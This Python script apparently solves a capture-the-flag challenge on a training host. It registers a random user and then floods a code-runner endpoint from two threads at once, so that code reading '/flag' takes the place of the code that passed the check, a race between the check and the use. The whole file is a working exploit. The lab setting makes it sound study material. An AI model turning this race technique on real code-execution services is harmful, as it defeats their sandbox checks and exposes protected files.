import requests
import threading
import time
import random
import string

base_url = 'http://pybook.training.jinblack.it/'

def random_user():
    username = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    password = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    return username, password

def login(session, username, password):
    login_url = base_url + 'login'
    response = session.post(login_url, data={'username': username, 'password': password})
    return response.text

def register(session, username, password):
    register_url = base_url + 'register'
    response = session.post(register_url, data={'username': username, 'password': password})
    return response.text

def post_code(session, code):
    run_url = base_url + 'run'
    # code is sent with no json, just text
    response = session.post(run_url, data=code)
    if 'flag' in response.text:
        print(response.text)
    print(response.text)
    return response.text # this is the output of the code execution if the code is valid (hopefully we exploit this :D)

u, p = random_user()

s = requests.Session()

register(s, u, p)
login(s, u, p)

valid_code = "print(5+5)"
not_allowed_code = """
print(open('/flag').read())
"""

# We exploit race condition: we send the valid code and then we send the not allowed code, in this way the valide code
# is overwritten by the not allowed code and we webapp executes the not allowed code thinking it is the valid code
# TOCTOU: Time Of Check Time Of Use
while True:
    t1 = threading.Thread(target=post_code, args=(s, valid_code))
    t2 = threading.Thread(target=post_code, args=(s, not_allowed_code))
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    time.sleep(0.1)
